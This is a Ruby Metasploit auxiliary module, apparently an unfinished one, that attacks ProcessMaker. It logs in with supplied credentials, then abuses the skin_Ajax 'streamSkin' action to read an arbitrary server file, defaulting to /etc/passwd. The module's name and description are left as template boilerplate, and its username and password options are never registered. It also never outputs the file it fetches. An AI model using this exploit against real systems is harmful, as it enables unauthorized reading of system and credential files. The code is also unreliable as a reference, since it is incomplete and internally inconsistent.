##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Empty Auxiliary Module',
      'Description'    => %q{
    This is a short descrption for an auxiliary module. Also lists
    the version tested.

    A longer description after the short description goes into more
    detail about the module, the vulnerbaility, or whatever information
    is useful to provide for documentation purposes.

    Categories: Open Source

    Price: 0

    Video: none

    OS: Multi

    Arch: Multi

    Requirements: Metasploit Framework
      },
      'References'     =>
        [
        ],
      'Author'         =>
        [
        ],
      'License'        => 'VolatileMinds',
      'DisclosureDate' => ''
    ))

    register_options(
      [
        OptString.new("TARGETURI", [true, 'The relative URI of ProcessMaker', '/']),
        OptString.new('FILEPATH', [true, 'The file path on the server to read', '/etc/passwd'])
      ], self.class)
  end

  def run
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/sysworkflow/en/neoclassic/login/login')
    })

    cookie = res.get_cookies

    data = Rex::MIME::Message.new
    data.add_part("[{'name':'USR_USERNAME','type':'text','label':'User','validate':'Any','required':'0'}]", nil, nil, 'form-data; name="__notValidateThisFields"')
    data.add_part("[{'name':'USR_USERNAME','type':'text','label':'User','validate':'Any','required':'0'}]", nil, nil, 'form-data; name="DynaformRequiredFields"')
    data.add_part('-18000', nil, nil, 'form-data; name="form[BROWSER_TIME_ZONE_OFFSET]"')
    data.add_part(datastore['PASSWORD'], nil, nil, 'form-data; name="form[USR_PASSWORD]"')
    data.add_part(datastore['USERNAME'], nil, nil, 'form-data; name="form[USR_USERNAME]"')
    data.add_part('', nil, nil, 'form-data; name="form[USR_PASSWORD_MASK]"')
    data.add_part('en', nil, nil, 'form-data; name="form[USER_LANG]"')
    data.add_part('', nil, nil, 'form-data; name="form[URL]"')
    data.add_part('0', nil, nil, 'form-data; name="form[FAILED_LOGINS]"')

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/sysworkflow/en/neoclassic/login/authentication.php'),
      'data' => data.to_s,
      'ctype' => 'multipart/form-data; boundary=' + data.bound,
      'cookie' => cookie,
      'headers' => {
        'Referer' => normalize_uri(target_uri.path, '/sysworkflow/en/neoclassic/login/login')
      }
    })

    unless res && res.code == 200 && res.body =~ /Loading styles and images/
      fail_with(Failure::Unknown, "Authentication failed")
    end

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, '/sysworkflow/en/neoclassic/setup/skin_Ajax'),
      'vars_get' => {
      'action' => 'streamSkin',
      'file' => datastore['FILEPATH']
      },
      'cookie' => cookie
    })

  end
end

